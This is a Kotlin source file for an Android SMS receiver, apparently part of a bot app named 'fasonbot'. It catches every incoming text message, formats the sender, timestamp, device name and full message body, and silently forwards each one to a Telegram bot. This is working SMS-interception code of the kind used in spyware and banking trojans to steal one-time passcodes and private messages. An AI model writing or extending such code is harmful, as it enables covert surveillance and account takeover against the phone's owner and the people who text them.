package com.fasonbot.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.service.CoreService
import com.fasonbot.app.util.PermissionHelper
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return
        if (!PermissionHelper.hasReadSms(context)) return

        val bundle = intent.extras ?: return

        try {
            @Suppress("DEPRECATION")
            val pdus = bundle.get("pdus") as? Array<*> ?: return
            val format = bundle.getString("format") ?: "3gpp"
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())

            for (pdu in pdus) {
                try {
                    // Android 9+ requires format parameter for createFromPdu
                    val msg = SmsMessage.createFromPdu(pdu as ByteArray, format)

                    val originatingAddress = msg.originatingAddress ?: "Unknown"
                    val messageBody = msg.messageBody ?: ""
                    val timestamp = msg.timestampMillis

                    val text = buildString {
                        append("📱 New SMS Received\n\n")
                        append("• From: $originatingAddress\n")
                        append("• Device: ${BotConfig.getDeviceName()}\n")
                        append("• Time: ${dateFormat.format(Date(timestamp))}\n\n")
                        append("💬 Message:\n$messageBody")
                    }

                    notifyTelegram(context, text)
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing SMS pdu: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in SmsReceiver: ${e.message}")
        }
    }

    private fun notifyTelegram(context: Context, message: String) {
        try {
            val bot = CoreService.getTelegramBot(context)
            bot.sendMessage(message)
        } catch (e: Exception) {
            Log.e(TAG, "Error sending to Telegram: ${e.message}")
        }
    }
}
